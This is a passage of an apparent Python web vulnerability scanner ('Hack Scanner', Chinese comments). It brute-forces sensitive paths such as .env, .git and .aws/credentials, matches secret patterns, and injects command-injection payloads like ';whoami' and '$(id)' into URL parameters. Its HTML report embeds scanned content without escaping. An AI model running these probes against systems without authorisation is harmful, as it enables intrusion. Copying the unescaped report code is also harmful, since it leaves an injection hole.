            'cwe': 'CWE-200', 'severity': Severity.MEDIUM,
            'title': '发现内网IP地址', 'rec': '移除配置文件中的内网IP暴露'
        },
        {
            'name': 'JWT Token',
            'pattern': r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+',
            'cwe': 'CWE-287', 'severity': Severity.HIGH,
            'title': '发现JWT Token', 'rec': '不要在响应中返回完整JWT，使用短期token+refresh token'
        },
    ]

    @staticmethod
    def detect(content: str) -> List[VulnFinding]:
        findings = []
        for p in SensitiveDataDetector.PATTERNS:
            matches = re.findall(p['pattern'], content)
            if matches:
                # 去重并截断证据
                unique_matches = list(set(m if isinstance(m, str) else m[0] for m in matches))[:3]
                findings.append(VulnFinding(
                    id=f'SENSITIVE_{p["name"]}',
                    severity=p['severity'],
                    title=p['title'],
                    description=f'在页面内容中检测到匹配 {p["name"]} 的模式，可能存在敏感信息泄露',
                    url='', evidence=str(unique_matches[0]) if unique_matches else 'N/A',
                    recommendation=p['rec'], cwe=p['cwe'], cvss=7.5 if p['severity'] in (Severity.CRITICAL, Severity.HIGH) else 3.0
                ))

        return findings


# ==================== 目录爆破 ====================
class DirBuster:
    """增强版目录/文件枚举 — 支持 SPA/CDN + API端点探测"""

    # 传统服务端路径
    COMMON_PATHS = [
        'admin', 'administrator', 'login', 'wp-admin', 'wp-login.php',
        'wp-content', 'wp-config.php', 'config.php', 'configuration.php',
        '.git', '.svn', '.env', '.htaccess', '.htpasswd',
        'phpmyadmin', 'pma', 'phpinfo.php', 'info.php', 'test.php',
        'backup', 'backups', 'dump', 'db', 'database',
        'api', 'v1', 'v2', 'swagger', 'graphql', 'graphiql',
        'console', 'debug', 'trace', 'actuator',
        'server-status', 'server-info', 'robots.txt', 'sitemap.xml',
        'crossdomain.xml', 'clientaccesspolicy.xml',
        'web.config', 'composer.json', 'package.json',
        'elmah.axd', 'error.log', 'access.log',
    ]

    # SPA/CDN 特有路径（前端路由、构建产物、API网关）
    SPA_PATHS = [
        'index.html', 'app.js', 'main.js', 'bundle.js',
        'chunk-vendors.js', 'vendor.js', 'runtime.js',
        'manifest.json', 'service-worker.js', 'offline.html',
        '.well-known/security.txt',
        'api/v1/health', 'api/v1/info', 'api/v1/status',
        'api/v1/config', 'api/health', 'api/status',
        'actuator/health', 'actuator/info', 'management/health',
        '_next/static/chunks', 'static/js', 'assets/js',
        '__proto__', 'constructor', 'prototype',
        '.DS_Store', 'Thumbs.db', 'node_modules',
        'dist/index.html', 'build/index.html', 'public/',
        'wp-json/wp/v2/users', 'xmlrpc.php',
        '.aws/credentials', 'META-INF/maven',
        'favicon.ico', 'manifest.webapp',
    ]

    @staticmethod
    def _fetch(target: str) -> Optional[requests.Response]:
        """统一的 GET 请求（head 对 CDN 可能返回 0 长度）"""
        try:
            resp = requests.get(target, timeout=5, allow_redirects=True,
                               headers={'User-Agent': CONFIG['scanner']['user_agent']})
            return resp
        except Exception:
            return None

    @staticmethod
    def bust(url: str) -> List[Dict]:
        results = []
        parsed = urlparse(url)
        hostname = parsed.hostname or ''
        base_url = f"{parsed.scheme}://{hostname}"

        # 合并路径列表
        all_paths = DirBuster.COMMON_PATHS + DirBuster.SPA_PATHS

        for path in all_paths:
            target = f"{base_url}/{path}"
            resp = DirBuster._fetch(target)
            if resp is None:
                continue

            # 跳过 CDN 默认回源页（如抖音、CloudFront 的 403/404 "file not found"）
            body_preview = (resp.text or '')[:200].lower()
            is_cdn_dummy = any(kw in body_preview for kw in [
                'file not found', 'the resource you requested does not exist',
                'requested url was not found', 'not found', 'cloudfront',
                'access denied', 'cdn error', '404 page', 'resource not found',
            ])

            if is_cdn_dummy and resp.status_code in (403, 404):
                # CDN 兜底页，不算有效发现
                continue

            status = resp.status_code
            # 判断是否敏感：返回正常内容或权限拒绝但非默认 CDN 页
            dangerous = False
            if status == 200:
                # 有实际内容返回
                content_type = (resp.headers.get('Content-Type', '')).lower()
                if len(resp.text) > 50 and 'text/html' in content_type:
                    title_match = re.search(r'<title>([^<]+)</title>', resp.text, re.IGNORECASE)
                    title = (title_match.group(1) if title_match else '').strip()[:60]
                    dangerous = True
                elif 'application/json' in content_type and len(resp.text) > 20:
                    try:
                        json.loads(resp.text[:500])
                        dangerous = True  # JSON API 端点通常有意义
                    except Exception:
                        pass
            elif status in (403, 401):
                dangerous = True  # 权限拒绝说明路径存在

            if dangerous or status in (200, 301, 302, 403, 401):
                results.append({
                    'url': target,
                    'status': status,
                    'size': len(resp.text) if resp.text else 0,
                    'redirect': resp.headers.get('Location', ''),
                    'title': '',
                    'dangerous': dangerous or path.startswith('.') or any(
                        kw in path.lower() for kw in ['api', 'admin', 'secret', 'config', '.env', '.git']
                    ),
                })

        return results


# ==================== URL扫描主控制器 ====================
class URLScanner:
    """URL扫描器主类"""

    def __init__(self, output_dir: str = None):
        self.output_dir = output_dir or os.path.join(os.getcwd(), 'hack_report')
        os.makedirs(self.output_dir, exist_ok=True)
        # 将日志输出到同一目录
        log_file = os.path.join(self.output_dir, 'scanner.log')
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s [%(levelname)s] %(message)s',
            handlers=[
                logging.StreamHandler(sys.stdout),
                logging.FileHandler(log_file, encoding='utf-8')
            ]
        )
        self.client = SecureHTTPClient(
            timeout=CONFIG['scanner']['timeout'],
            max_retries=CONFIG['scanner'].get('max_retries', 3)
        )

    def scan(self, target_url: str) -> ScanResult:
        logger.info(f"🎯 开始扫描目标: {target_url}")

        parsed = urlparse(target_url)
        result = ScanResult(target_url=target_url, hostname=parsed.hostname or 'unknown')

        # ==================== 1. SSL/TLS检查 ====================
        if CONFIG['urls'].get('check_ssl', True):
            logger.info("🔒 检查SSL/TLS...")
            https_url = f"https://{parsed.netloc}{parsed.path}" if parsed.scheme != 'https' else target_url
            result.ssl_info = SSLChecker.check(https_url)
            if result.ssl_info['warnings']:
                for w in result.ssl_info['warnings']:
                    logger.warning(f"  SSL: {w}")

        # ==================== 2. HTTP头检查 ====================
        logger.info("📋 获取HTTP响应头...")
        resp = self.client.get(target_url)
        if resp is None:
            logger.error(f"无法访问目标: {target_url}")
            return result

        result.http_headers = dict(resp.headers)

        if CONFIG['urls'].get('check_headers', True):
            logger.info("🛡️ 检查安全头...")
            header_findings = HeaderChecker.check(resp.headers)
            for f in header_findings:
                f.url = target_url
                result.add_finding(f)

        # ==================== 3. 技术栈识别 ====================
        logger.info("🔍 技术栈检测...")
        techs = self._detect_technologies(resp.text, resp.headers)
        result.technologies = techs
        for t in techs[:10]:
            logger.info(f"  📦 {t}")

        # ==================== 4. CORS检查 ====================
        if CONFIG['urls'].get('check_cors', True):
            logger.info("🌐 检查CORS配置...")
            cors_findings = CORSChecker.check(target_url, resp)
            for f in cors_findings:
                f.url = target_url
                result.add_finding(f)

        # ==================== 5. SQL注入检测 ====================
        if CONFIG['urls'].get('check_sqli', True) and parsed.query:
            logger.info("💉 检查SQL注入...")
            sqli_findings = SQLiDetector.detect(target_url)
            for f in sqli_findings:
                result.add_finding(f)

        # ==================== 6. XSS检测 ====================
        if CONFIG['urls'].get('check_xss', True) and parsed.query:
            logger.info("🎭 检查XSS...")
            xss_findings = XSSDetector.detect(target_url)
            for f in xss_findings:
                result.add_finding(f)

        # ==================== 7. SSRF检测 ====================
        if CONFIG['urls'].get('check_ssrf', True) and parsed.query:
            logger.info("🌐 检查SSRF...")
            ssrf_findings = SSRFDetector.detect(target_url)
            for f in ssrf_findings:
                result.add_finding(f)

        # ==================== 8. LFI检测 ====================
        if CONFIG['urls'].get('check_lfi', True) and parsed.query:
            logger.info("📁 检查文件包含...")
            lfi_findings = LFIDetector.detect(target_url)
            for f in lfi_findings:
                result.add_finding(f)

        # ==================== 9. WfW检测 ====================
        if CONFIG['urls'].get('check_wwn', True):
            logger.info("🎮 检查命令注入...")
            rce_findings = self._check_rce(target_url)
            for f in rce_findings:
                result.add_finding(f)

        # ==================== 10. 敏感信息泄露 ====================
        if CONFIG['urls'].get('check_sensitive_data', True):
            logger.info("🕵️ 扫描敏感信息泄露...")
            sensitive_findings = SensitiveDataDetector.detect(resp.text)
            for f in sensitive_findings:
                f.url = target_url
                result.add_finding(f)

        # ==================== 11. 子域名枚举 ====================
        if CONFIG['urls'].get('enum_subdomains', True):
            logger.info("🌳 子域名枚举...")
            ext = tldextract.extract(parsed.hostname)
            base_domain = ext.registered_domain or parsed.hostname
            result.subdomains = SubdomainEnum.enum(base_domain)
            if result.subdomains:
                logger.info(f"  发现 {len(result.subdomains)} 个子域名: {', '.join(result.subdomains[:10])}")

        # ==================== 12. 目录爆破 ====================
        if CONFIG['urls'].get('dir_busting', {}).get('enabled', False):
            logger.info("📂 目录爆破...")
            result.dir_bust_results = DirBuster.bust(target_url)
            dangerous = [d for d in result.dir_bust_results if d.get('dangerous')]
            if dangerous:
                logger.warning(f"  ⚠️ 发现 {len(dangerous)} 个敏感路径!")

        # ==================== 13. URL发现 ====================
        soup = BeautifulSoup(resp.text, 'lxml')
        for a_tag in soup.find_all('a', href=True):
            full_url = urljoin(target_url, a_tag['href'])
            if parsed.netloc in full_url:
                result.discovered_urls.append(full_url)

        logger.info(f"✅ 扫描完成! 发现 {result.finding_count} 个漏洞 ({result.critical_count} critical, {result.high_count} high)")
        return result

    def _detect_technologies(self, html: str, headers: dict) -> List[str]:
        techs = []

        # 从响应头检测
        for hdr, framework in [
            ('X-Powered-By', {'PHP': 'PHP', 'Express': 'Node.js/Express', 'ASP.NET': '.NET'}),
            ('Server', {'nginx': 'Nginx', 'Apache': 'Apache', 'IIS': 'IIS', 'cloudflare': 'Cloudflare WAF', 'aws': 'AWS'}),
        ]:
            if hdr.lower() in [h.lower() for h in headers]:
                val = headers.get(hdr, '')
                for key, val_name in framework.items():
                    if key.lower() in val.lower():
                        techs.append(f"Server: {val_name}")

        # 从HTML检测框架
        framework_indicators = {
            'jQuery': r'jquery.*\.js',
            'React': r'react.*\.js|react-dom',
            'Vue.js': r'vue.*\.js',
            'Angular': r'angular.*\.js|@angular/core',
            'WordPress': r'wp-(content|includes)',
            'Laravel': r'_token|laravel_session',
            'Django': r'csrftoken',
            'Bootstrap': r'bootstrap.*\.css',
            'Tailwind': r'tailwind',
        }

        for name, pattern in framework_indicators.items():
            if re.search(pattern, html, re.IGNORECASE):
                techs.append(f"Frontend: {name}")

        # CSP检测框架
        csp = headers.get('Content-Security-Policy', '')
        if 'strict-dynamic' in csp:
            techs.append("CSP Strict-Dynamic detected")

        return list(set(techs))

    def _check_rce(self, url: str) -> List[VulnFinding]:
        findings = []
        parsed = urlparse(url)
        if not parsed.query:
            return findings

        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])
        cmd_keywords = ['cmd', 'command', 'exec', 'shell', 'run', 'system', 'ping', 'nslookup']

        for param_name, original_val in params.items():
            if not any(kw in param_name.lower() for kw in cmd_keywords):
                continue
            if len(original_val) > 50:
                continue

            rce_payloads = [';ls', '|ls', '`id`', '$(id)', ';whoami', '&whoami']
            for payload in rce_payloads:
                try:
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    params_copy = params.copy()
                    query_str = '&'.join(
                        f"{k}={quote_plus(v)}" if k != param_name else f"{k}={payload}"
                        for k, v in params_copy.items()
                    )
                    test_url += f"?{query_str}"

                    resp = requests.get(test_url, timeout=10)
                    if any(cmd in resp.text for cmd in ['uid=', 'gid=', 'total', 'dir']):
                        findings.append(VulnFinding(
                            id=f'RCE_{param_name}',
                            severity=Severity.CRITICAL,
                            title=f'GET {param_name} 可能存在命令注入',
                            description='参数允许执行系统命令，可导致服务器完全沦陷',
                            url=test_url, evidence=f"Payload: {payload}",
                            recommendation='禁止用户输入拼接系统命令，使用白名单机制',
                            cwe='CWE-78', cvss=10.0, params={'param': param_name}
                        ))
                except Exception:
                    pass

        return findings


# ==================== 报告生成器 ====================
class ReportGenerator:
    """HTML格式扫描报告"""

    @staticmethod
    def generate(result: ScanResult, output_file: str = 'report.html'):
        severity_stats = {s.value: 0 for s in Severity}
        for f in result.findings:
            severity_stats[f.severity.value] += 1

        risk_score = (result.critical_count * 25 +
                      result.high_count * 15 +
                      sum(1 for f in result.findings if f.severity == Severity.MEDIUM) * 5 +
                      sum(1 for f in result.findings if f.severity == Severity.LOW) * 1)

        risk_level = "🟢 SAFE" if risk_score < 20 else \
                     "🟡 MODERATE" if risk_score < 60 else \
                     "🔴 HIGH RISK" if risk_score < 100 else \
                     "☠️ CRITICAL"

        html = f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>\U0001f510 漏洞扫描报告 - {result.target_url}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', system-ui, sans-serif; background: #0d1117; color: #c9d1d9; line-height: 1.6; }}
        .container {{ max-width: 1200px; margin: 0 auto; padding: 2rem; }}
        header {{ text-align: center; padding: 3rem 0; border-bottom: 1px solid #21262d; margin-bottom: 2rem; }}
        h1 {{ font-size: 2.5rem; background: linear-gradient(135deg, #58a6ff, #f78166); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
        .target {{ color: #8b949e; font-size: 1.2rem; margin-top: 0.5rem; word-break: break-all; }}
        .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin: 2rem 0; }}
        .card {{ background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 1.5rem; text-align: center; }}
        .card .num {{ font-size: 2.5rem; font-weight: bold; }}
        .card .label {{ color: #8b949e; margin-top: 0.5rem; }}
        .risk {{ text-align: center; padding: 1.5rem; border-radius: 12px; font-size: 1.3rem; font-weight: bold; margin: 2rem 0; }}
        .findings {{ margin: 2rem 0; }}
        .finding {{ background: #161b22; border-left: 4px solid; border-radius: 8px; padding: 1.2rem; margin: 0.8rem 0; transition: transform 0.2s; }}
        .finding:hover {{ transform: translateX(5px); }}
        .critical {{ border-color: #dc3545; }} .critical .sev {{ color: #dc3545; }}
        .high {{ border-color: #fd7e14; }} .high .sev {{ color: #fd7e14; }}
        .medium {{ border-color: #ffc107; }} .medium .sev {{ color: #ffc107; }}
        .low {{ border-color: #17a2b8; }} .low .sev {{ color: #17a2b8; }}
        .info {{ border-color: #6c757d; }} .info .sev {{ color: #6c757d; }}
        .sev {{ font-weight: bold; text-transform: uppercase; font-size: 0.85rem; }}
        .finding h3 {{ margin: 0.5rem 0; color: #e6edf3; }}
        .finding .url {{ word-break: break-all; color: #58a6ff; font-size: 0.9rem; margin: 0.3rem 0; }}
        .finding .cwe {{ color: #8b949e; font-size: 0.85rem; }}
        .finding .rec {{ background: #1c2333; padding: 0.8rem; border-radius: 6px; margin-top: 0.8rem; font-size: 0.9rem; color: #7ee787; }}
        .finding .evd {{ background: #1c2333; padding: 0.8rem; border-radius: 6px; margin-top: 0.5rem; font-family: monospace; font-size: 0.85rem; color: #ffa657; word-break: break-all; }}
        .section-title {{ font-size: 1.5rem; margin: 2rem 0 1rem; color: #e6edf3; border-bottom: 2px solid #30363d; padding-bottom: 0.5rem; }}
        footer {{ text-align: center; padding: 2rem 0; color: #484f58; font-size: 0.9rem; margin-top: 3rem; border-top: 1px solid #21262d; }}
        .tech-list {{ display: flex; flex-wrap: wrap; gap: 0.5rem; justify-content: center; margin: 1rem 0; }}
        .tag {{ background: #21262d; padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.85rem; color: #79c0ff; }}
        table {{ width: 100%; border-collapse: collapse; margin: 1rem 0; }}
        th, td {{ padding: 0.6rem; text-align: left; border-bottom: 1px solid #21262d; }}
        th {{ color: #8b949e; font-size: 0.9rem; }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🔐 安全扫描报告</h1>
            <p class="target">{result.target_url}</p>
            <p style="color:#484f58; margin-top:0.5rem;">生成时间: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
        </header>

        <div class="summary">
            <div class="card"><div class="num">{result.finding_count}</div><div class="label">总漏洞数</div></div>
            <div class="card" style="border-color: #dc3545;"><div class="num" style="color:#dc3545;">{result.critical_count}</div><div class="label">严重 (Critical)</div></div>
            <div class="card" style="border-color: #fd7e14;"><div class="num" style="color:#fd7e14;">{result.high_count}</div><div class="label">高危 (High)</div></div>
            <div class="card"><div class="num">{severity_stats['medium']}</div><div class="label">中危 (Medium)</div></div>
        </div>

        <div class="risk" style="background: #161b22; border: 1px solid {('#dc3545' if risk_score >= 80 else '#fd7e14' if risk_score >= 40 else '#ffc107')};">
            风险评级: {risk_level} (综合评分: {risk_score})
        </div>

        {'<h2 class="section-title">🛡️ HTTP安全头状态</h2>' if result.http_headers else ''}
        {'<table><tr><th>Header</th><th>值</th></tr>' + ''.join(f'<tr><td style="color:#79c0ff">{k}</td><td>{v[:80]}</td></tr>' for k,v in result.http_headers.items()) + '</table>' if result.http_headers else ''}

        <h2 class="section-title">📦 技术栈</h2>
        <div class="tech-list">
            {''.join(f'<span class="tag">{t}</span>' for t in result.technologies)}
        </div>

        {'<h2 class="section-title">🌳 子域名 (' + str(len(result.subdomains)) + ')</h2><table><tr><th>子域名</th></tr>' + ''.join(f'<tr><td style="color:#79c0ff">{d}</td></tr>' for d in result.subdomains[:50]) + '</table>' if result.subdomains else ''}

        <div class="findings">
            <h2 class="section-title">🐛 漏洞清单 ({result.finding_count})</h2>"""

        # 按严重程度排序输出
        for finding in sorted(result.findings, key=lambda f: f.severity, reverse=True):
            html += f"""
            <div class="finding {finding.severity.value}">
                <span class="sev">[{finding.severity.value.upper()}]</span>
                <h3>{finding.title}</h3>
                <p style="color:#8b949e;">{finding.description}</p>
                {'<p class="url">🔗 ' + finding.url + '</p>' if finding.url else ''}
                {'<p class="evd">📎 证据: ' + finding.evidence[:500].replace('\\n', '<br>') + '</p>' if finding.evidence else ''}
                <p class="cwe">CWE-ID: {finding.cwe} | CVSS: {finding.cvss}</p>
                <div class="rec">💡 修复建议: {finding.recommendation}</div>
            </div>"""

        if not result.findings:
            html += '<p style="color:#7ee787; text-align:center; padding:2rem;">✅ 未检测到明显漏洞！</p>'

        # 目录爆破结果
        if result.dir_bust_results:
            html += '<h2 class="section-title">📂 发现的目录/路径 (' + str(len(result.dir_bust_results)) + ')</h2><table><tr><th>URL</th><th>状态</th><th>类型</th></tr>'
            for d in result.dir_bust_results:
                color = '#dc3545' if d.get('dangerous') else '#7ee787'
                html += f'<tr><td style="word-break:break-all;color:#79c0ff">{d["url"]}</td><td>{d["status"]}</td><td style="color:{color}">{"敏感" if d.get("dangerous") else "普通"}</td></tr>'
            html += '</table>'

        html += f"""
        </div>
        <footer>
            <p>🔐 Hack Scanner v1.0 | Generated by Automated Penetration Testing Framework</p>
            <p style="margin-top:0.5rem;">本报告仅供授权安全测试使用，请遵守相关法律法规</p>
        </footer>
    </div>
</body>
</html>"""

        # 写入文件
        full_path = os.path.join(os.path.dirname(output_file), output_file) if os.path.dirname(output_file) else output_file
        with open(full_path, 'w', encoding='utf-8') as f:
            f.write(html)
        return full_path

    @staticmethod
    def generate_json(result: ScanResult, output_file: str = 'report.json'):
        data = {
            'target': result.target_url,
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'summary': {
                'total': result.finding_count,
                'critical': result.critical_count,
                'high': result.high_count,
                'technologies': result.technologies,
                'subdomains': result.subdomains[:20],
                'discovered_urls': result.discovered_urls[:50],
            },
            'findings': [f.to_dict() for f in sorted(result.findings, key=lambda x: x.severity, reverse=True)],
        }
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        return output_file

    @staticmethod
    def generate_from_combined(combo_data: dict, output_file: str = 'report.html'):
        """
        Generate a full HTML report from combined scan data.
        combo_data has same shape as the JSON report structure.
        This embeds the JSON content directly into the HTML page
        so users can see both the visual report and raw JSON side by side.
        """
        findings_raw = combo_data.get('url_findings', []) + combo_data.get('file_findings', [])
        summary = combo_data.get('summary', {})
        total = len(findings_raw)
        sev_breakdown = combo_data.get('summary', {}).get('severity_breakdown', {})
        critical_count = sev_breakdown.get('critical', 0)
        high_count = sev_breakdown.get('high', 0)
        medium_count = sev_breakdown.get('medium', 0)
        low_count = sev_breakdown.get('low', 0)
        info_count = sev_breakdown.get('info', 0)
        risk_level = summary.get('risk_level', '🟢 LOW RISK')

        risk_score = critical_count * 25 + high_count * 15 + medium_count * 5 + low_count * 1
        risk_color = '#dc3545' if risk_score >= 80 else '#fd7e14' if risk_score >= 40 else '#ffc107'

        # Build findings HTML (each finding is a dict)
        def fmt_finding(f):
            sev = f.get('severity', 'info')
            title = f.get('title', '')
            desc = f.get('description', '')
            url_info = f.get('url', '') or ''
            evidence = f.get('evidence', '')
            rec = f.get('recommendation', '')
            cwe = f.get('cwe', '')
            cvss = f.get('cvss', 0)
            cat = f.get('category', '') or f.get('type', '扫描')
            file_info = f.get('file_path', '') or ''
            line_num = f.get('line_number', 0)

            return f"""
            <div class="finding {sev}">
                <span class="sev">[{sev.upper()}]</span>
                <h3>{title}</h3>
                <p style="color:#8b949e;">{cat}: {desc}</p>
                {'<p class="url">🔗 ' + url_info + '</p>' if url_info else ''}
                {'<p class="url">📁 文件: ' + file_info + (':' + str(line_num) if line_num else '') + '</p>' if file_info else ''}
                {'<p class="evd">📎 证据: ' + evidence[:400].replace(chr(10), '<br>') + '</p>' if evidence else ''}
                <p class="cwe">CWE-ID: {cwe} | CVSS: {cvss}</p>
                {'<div class="rec">💡 修复建议: ' + rec + '</div>' if rec else ''}
            </div>"""

        findings_html = ''.join(fmt_finding(f) for f in findings_raw[:200])
        if not findings_raw:
            findings_html = '<p style="color:#7ee787; text-align:center; padding:2rem;">✅ 未检测到明显漏洞！</p>'

        # Build combined summary section (shows URL scan + file scan side by side)
        url_target = summary.get('url_target', 'N/A')
        url_count = summary.get('url_findings_count', 0)
        technologies = summary.get('url_technologies', [])
        subdomains = summary.get('url_subdomains', [])
        file_path = summary.get('file_path', 'N/A')
        file_count = summary.get('file_findings_count', len(findings_raw))
        langs = summary.get('languages', {})

        tech_tags = ''.join(f'<span class="tag">{t}</span>' for t in technologies[:15]) if technologies else '<span style="color:#8b949e;">未检测</span>'
        subdomain_rows = ''.join(f'<tr><td style="color:#79c0ff">{d}</td></tr>' for d in subdomains[:30]) if subdomains else ''
        lang_info = ''.join(f'<span class="tag">{lang}: {cnt}文件</span>' for lang, cnt in langs.items()) if langs else '<span style="color:#8b949e;">未知</span>'

        # Embedded JSON section (collapsible)
        json_content = json.dumps(combo_data, ensure_ascii=False, indent=2)
        json_block = f"""
        <details class="json-section">
            <summary style="cursor:pointer; color:#79c0ff; padding:1rem; background:#161b22; border-radius:8px; font-size:1.1rem;">📋 查看完整 JSON 数据报告 (click to expand)</summary>
            <pre style="background:#0d1117; color:#c9d1d9; padding:1.5rem; overflow-x:auto; font-size:0.85rem; border-radius:8px; margin-top:0.5rem; max-height:600px;">{json_content}</pre>
        </details>"""

        html = f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 综合漏洞扫描报告</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', system-ui, sans-serif; background: #0d1117; color: #c9d1d9; line-height: 1.6; }}
        .container {{ max-width: 1200px; margin: 0 auto; padding: 2rem; }}
        header {{ text-align: center; padding: 3rem 0; border-bottom: 1px solid #21262d; margin-bottom: 2rem; }}
        h1 {{ font-size: 2.5rem; background: linear-gradient(135deg, #58a6ff, #f78166); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
        .target {{ color: #8b949e; font-size: 1.2rem; margin-top: 0.5rem; word-break: break-all; }}
        .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin: 2rem 0; }}
        .card {{ background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 1.5rem; text-align: center; }}
        .card .num {{ font-size: 2.5rem; font-weight: bold; }}
        .card .label {{ color: #8b949e; margin-top: 0.5rem; }}
        .risk {{ text-align: center; padding: 1.5rem; border-radius: 12px; font-size: 1.3rem; font-weight: bold; margin: 2rem 0; }}
        .findings {{ margin: 2rem 0; }}
        .finding {{ background: #161b22; border-left: 4px solid; border-radius: 8px; padding: 1.2rem; margin: 0.8rem 0; transition: transform 0.2s; }}
        .finding:hover {{ transform: translateX(5px); }}
        .critical {{ border-color: #dc3545; }} .critical .sev {{ color: #dc3545; }}
        .high {{ border-color: #fd7e14; }} .high .sev {{ color: #fd7e14; }}
        .medium {{ border-color: #ffc107; }} .medium .sev {{ color: #ffc107; }}
        .low {{ border-color: #17a2b8; }} .low .sev {{ color: #17a2b8; }}
        .info {{ border-color: #6c757d; }} .info .sev {{ color: #6c757d; }}
        .sev {{ font-weight: bold; text-transform: uppercase; font-size: 0.85rem; }}
        .finding h3 {{ margin: 0.5rem 0; color: #e6edf3; }}
        .finding .url {{ word-break: break-all; color: #58a6ff; font-size: 0.9rem; margin: 0.3rem 0; }}
        .finding .cwe {{ color: #8b949e; font-size: 0.85rem; }}
        .finding .rec {{ background: #1c2333; padding: 0.8rem; border-radius: 6px; margin-top: 0.8rem; font-size: 0.9rem; color: #7ee787; }}
        .finding .evd {{ background: #1c2333; padding: 0.8rem; border-radius: 6px; margin-top: 0.5rem; font-family: monospace; font-size: 0.85rem; color: #ffa657; word-break: break-all; }}
        .section-title {{ font-size: 1.5rem; margin: 2rem 0 1rem; color: #e6edf3; border-bottom: 2px solid #30363d; padding-bottom: 0.5rem; }}
        footer {{ text-align: center; padding: 2rem 0; color: #484f58; font-size: 0.9rem; margin-top: 3rem; border-top: 1px solid #21262d; }}
        .tech-list {{ display: flex; flex-wrap: wrap; gap: 0.5rem; justify-content: center; margin: 1rem 0; }}
        .tag {{ background: #21262d; padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.85rem; color: #79c0ff; }}
        table {{ width: 100%; border-collapse: collapse; margin: 1rem 0; }}
        th, td {{ padding: 0.6rem; text-align: left; border-bottom: 1px solid #21262d; }}
        th {{ color: #8b949e; font-size: 0.9rem; }}
        .split-view {{ display: grid; grid-template-columns: 1fr 1fr; gap: 2rem; margin: 2rem 0; }}
        .panel {{ background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 1.5rem; }}
        .panel h3 {{ color: #79c0ff; margin-bottom: 1rem; font-size: 1.2rem; }}
        @media (max-width: 800px) {{ .split-view {{ grid-template-columns: 1fr; }} }}
        .json-section pre {{ overflow-x: auto; }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🔐 综合安全扫描报告</h1>
            <p class="target">目标: {url_target}</p>
            <p style="color:#484f58; margin-top:0.5rem;">生成时间: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
        </header>

        <div class="summary">
            <div class="card"><div class="num">{total}</div><div class="label">总漏洞数</div></div>
            <div class="card" style="border-color: #dc3545;"><div class="num" style="color:#dc3545;">{critical_count}</div><div class="label">严重 (Critical)</div></div>
            <div class="card" style="border-color: #fd7e14;"><div class="num" style="color:#fd7e14;">{high_count}</div><div class="label">高危 (High)</div></div>
            <div class="card"><div class="num">{medium_count}</div><div class="label">中危 (Medium)</div></div>
        </div>

        <div class="risk" style="background: #161b22; border: 1px solid {risk_color};">
            风险评级: {risk_level} (综合评分: {risk_score})
        </div>

        <div class="split-view">
            <div class="panel">
                <h3>🎯 URL扫描结果</h3>
                <p><b>目标:</b> {url_target}</p>
                <p><b>漏洞数:</b> {url_count}</p>
                <p style="margin-top:0.5rem;"><b>技术栈:</b></p>
                <div class="tech-list">{tech_tags}</div>
            </div>
            <div class="panel">
                <h3>📁 文件扫描结果</h3>
                <p><b>目标:</b> {file_path}</p>
                <p><b>漏洞数:</b> {file_count}</p>
                <p style="margin-top:0.5rem;"><b>语言/类型:</b></p>
                <div class="tech-list">{lang_info}</div>
            </div>
        </div>

        {'<h2 class="section-title">🌳 子域名 (' + str(len(subdomains)) + ')</h2><table><tr><th>子域名</th></tr>' + subdomain_rows + '</table>' if subdomains else ''}

        <h2 class="section-title">🐛 漏洞清单 (前{min(total,200)}项 / 共{total}项)</h2>
        <div class="findings">
            {findings_html}
        </div>

        {json_block}

        <footer>
            <p>🔐 Hack Scanner v1.0 | Generated by Automated Penetration Testing Framework</p>
            <p style="margin-top:0.5rem;">本报告仅供授权安全测试使用，请遵守相关法律法规</p>
        </footer>
    </div>
</body>
</html>"""

        full_path = output_file
        with open(full_path, 'w', encoding='utf-8') as f:
            f.write(html)
        return full_path


# ==================== CLI入口 ====================
def print_banner():
    banner = """
╔══════════════════════════════════════════╗
║     🔐  Hack Scanner - 自动化漏洞扫描器    ║
║                                          ║
║     v1.0 | OWASP TOP10 + SSRF + RCE      ║
╚══════════════════════════════════════════╝
"""
    print(banner)


def scan_url(url: str, output_dir: str = '.'):
    print(f"\n{'='*60}")
    print(f"🎯 扫描目标: {url}")
    print('='*60)

    scanner = URLScanner()
    result = scanner.scan(url)

    # 生成报告
    html_path = os.path.join(output_dir, 'report.html')
    json_path = os.path.join(output_dir, 'report.json')

    ReportGenerator.generate(result, html_path)
    ReportGenerator.generate_json(result, json_path)

    print(f"\n📊 扫描结果:")
    print(f"  总漏洞: {result.finding_count}")
    print(f"  Critical: {result.critical_count}")
    print(f"  High:     {result.high_count}")
    print(f"  Medium:   {sum(1 for f in result.findings if f.severity == Severity.MEDIUM)}")
    print(f"\n📄 报告已保存:")
    print(f"  HTML: {html_path}")
    print(f"  JSON: {json_path}")

    return result


def main():
    import argparse
